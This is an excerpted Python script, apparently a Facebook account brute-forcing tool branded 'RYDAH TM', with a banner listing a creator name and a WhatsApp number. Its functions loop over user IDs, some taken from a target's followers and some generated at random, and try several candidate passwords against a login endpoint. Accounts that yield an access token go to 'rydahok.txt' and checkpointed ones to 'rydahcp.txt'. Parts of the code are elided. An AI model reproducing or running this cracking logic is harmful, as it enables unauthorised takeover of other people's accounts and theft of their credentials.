...
\033[1;92m❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽
\033[1;92m{~} \033[0;96mCreator > \x1b[1;91mRYDAH TM
\033[1;92m{~} \033[0;96mWhatsapp > \x1b[1;91m+2349017624430
\033[1;92m{~} \033[0;96mGithub > \x1b[1;91mhttps://github.com/you cant know it
\033[1;92m❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"""
...
def crack():
	...
	print("\x1b[1;92m       [2] CRACK FOLLOWERS ID")
...
def crack_select():
	...
	print(" \x1b[1;91m   The brute has started")
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [RYDAH TM-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("rydahok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RYDAH TM-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("rydahcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [RYDAH TM-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("rydahok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [RYDAH TM-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("rydahcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [RYDAH TM-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("rydahok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RYDAH TM-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("rydahcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [RYDAH TM-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("rydahok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [RYDAH TM-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("rydahcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [RYDAH TM-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("rydahok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [RYDAH TM-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("rydahcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
	...
	print("")
	os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')
	print("   \x1b[1;91mThe brute has been completed")
...
def choice_select():
	...
	os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')
	print(" \x1b[1;92m   Total IDs : "+str(len(id)))
	print(" \x1b[1;90m   The brute has started")
	print("    \x1b[1;91m Press ctrl + z to stop")
	os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')
	print("")
	def main(arg):
...
def ran():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[RYDAH TM-OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("rydahok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RYDAH CP] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("rydahcp.txt", "a")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[RYDAH TM-OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("rydahok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RYDAH TM-CP] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("rydahok.txt", "a")
	...
	print("")
	os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')
	print("   \x1b[1;91mRydah Brute has been completed")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')
	print("")
	print(" RYDAH TM ")
